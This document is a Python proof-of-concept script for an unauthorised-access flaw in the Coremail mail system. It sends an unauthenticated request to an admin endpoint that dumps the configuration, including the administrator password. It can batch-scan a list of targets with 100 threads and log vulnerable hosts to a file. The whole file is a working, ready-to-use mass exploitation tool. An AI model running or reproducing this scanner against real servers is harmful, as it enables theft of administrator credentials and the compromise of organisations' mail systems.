# Coremail 邮件系统未授权访问获取管理员账密POC
import requests, argparse, sys, re
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()


def banner():
    text = """


     ██████╗ ██████╗ ██████╗ ███████╗███╗   ███╗ █████╗ ██╗██╗      ███████╗███╗   ███╗ █████╗ ██╗██╗     
    ██╔════╝██╔═══██╗██╔══██╗██╔════╝████╗ ████║██╔══██╗██║██║      ██╔════╝████╗ ████║██╔══██╗██║██║     
    ██║     ██║   ██║██████╔╝█████╗  ██╔████╔██║███████║██║██║█████╗█████╗  ██╔████╔██║███████║██║██║     
    ██║     ██║   ██║██╔══██╗██╔══╝  ██║╚██╔╝██║██╔══██║██║██║╚════╝██╔══╝  ██║╚██╔╝██║██╔══██║██║██║     
    ╚██████╗╚██████╔╝██║  ██║███████╗██║ ╚═╝ ██║██║  ██║██║███████╗ ███████╗██║ ╚═╝ ██║██║  ██║██║███████╗
     ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝ ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚══════╝
                                                                                                    author:秋妤
                                                                                                    data:2024.09.10
                                                                                                    version:1.0


"""
    print(text)


def main():
    banner()
    arges = argparse.ArgumentParser(description='This is Coremail email system unauthorized access to POC')
    arges.add_argument('-u', '--url', dest='url', type=str, help='Please enter url')
    arges.add_argument('-f', '--file', dest='file', type=str, help='Please enter file')
    arg = arges.parse_args()
    if arg.url and not arg.file:
        poc(arg.url)
    elif arg.file and not arg.url:
        url_list = []
        with open(arg.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip())
            mp = Pool(100)
            mp.map(poc, url_list)
            mp.close()
            mp.join()
    else:
        print(f"Usag:\n\t python {sys.argv[0]} -h")


def poc(target):
    payload = '/mailsms/s?func=ADMIN:appState&dumpConfig=/'
    url = target+payload
    headers = {
       "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
    }
    try:
        res1 = requests.get(url=url,headers=headers,verify=False,timeout=5)
        if res1.status_code == 200 and 'password' in res1.text:
            print(f'[+]{target}存在漏洞')
            with open('Coremail_result.txt','a',encoding='utf-8') as f:
                f.write(f"[+]漏洞访问地址为:{url}\n")
        else:
            print(f'[-]{target}不存在漏洞')
    except Exception as e:
        print(f'[*]该url{target}可能存在访问问题，请手工测试')


if __name__ == '__main__':
    main()